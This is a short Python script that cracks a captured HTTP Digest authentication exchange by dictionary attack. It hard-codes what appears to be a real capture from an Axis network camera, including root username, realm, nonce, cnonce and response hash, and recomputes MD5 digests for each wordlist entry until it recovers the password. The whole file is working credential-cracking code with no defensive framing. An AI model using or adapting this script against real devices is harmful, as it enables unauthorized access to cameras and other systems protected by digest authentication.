import hashlib


def md5_hash(data):
    return hashlib.md5(data.encode()).hexdigest()


username = "root"
realm = "AXIS_ACCC8EC32DF4"
nonce = "Szpg9C8ZBgA=afbad248f2b4f60b3c8be8ef2867d5b76c0c7c72"
uri = "/jpg/image.jpg?camera=1&overview=0&resolution=1920x1080&videoframeskipmode=empty&fps=30&timestamp=1716543619923&Axis-Orig-Sw=true"
response = "c0a20e968ab6e8cc75ef9844770abf0e"
qop = "auth"
nc = "00000029"
cnonce = "17e7e77c7a0a6578"
method = "GET"


def compute_response(username, realm, password, nonce, uri, qop, nc, cnonce, method):
    HA1 = md5_hash(f"{username}:{realm}:{password}")
    HA2 = md5_hash(f"{method}:{uri}")
    return md5_hash(f"{HA1}:{nonce}:{nc}:{cnonce}:{qop}:{HA2}")


def crack_password(wordlist_file):
    with open(wordlist_file, 'r') as file:
        for line in file:
            password = line.strip()
            generated_response = compute_response(username, realm, password, nonce, uri, qop, nc, cnonce, method)
            print(f"Testing password {password} with hash {generated_response}")
            if generated_response == response:
                return password
    return None


wordlist_file = "wordlist.txt"


password = crack_password(wordlist_file)
if password:
    print(f"Password found: {password}")
else:
    print("Password not found in the provided wordlist")
